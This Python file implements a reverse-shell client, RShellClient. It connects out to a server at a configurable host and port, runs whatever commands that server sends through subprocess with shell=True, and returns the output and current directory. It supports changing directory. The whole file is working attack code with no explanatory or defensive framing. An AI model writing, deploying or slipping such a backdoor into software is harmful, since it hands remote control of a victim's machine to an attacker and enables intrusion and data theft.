import os
import socket
import subprocess

HOST = 'localhost'  # Remote server address
PORT = 8787         # Remote server port


class RShellClient:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        try:
            self._s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def socket_create(self):
        try:
            self._s.connect((self._host, self._port))
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def receive_commands(self):
        self._s.send(str.encode(str(os.getcwd()) + ' => '))
        while True:
            data = self._s.recv(1024)
            data = data.decode('utf-8').split(' ', maxsplit=1)
            command = data[0]
            if len(data) == 2:
                args = data[1]

            if command == 'cd':
                os.chdir(args)
                self._s.send(str.encode(str(os.getcwd()) + ' => '))
            elif command:
                cmd = subprocess.Popen(data[:], shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')
                self._s.send(str.encode(output_str + str(os.getcwd()) + ' => '))
                print(output_str)
        self._s.close()


def main():
    client = RShellClient(HOST, PORT)
    client.socket_create()
    client.receive_commands()


if __name__ == '__main__':
    main()
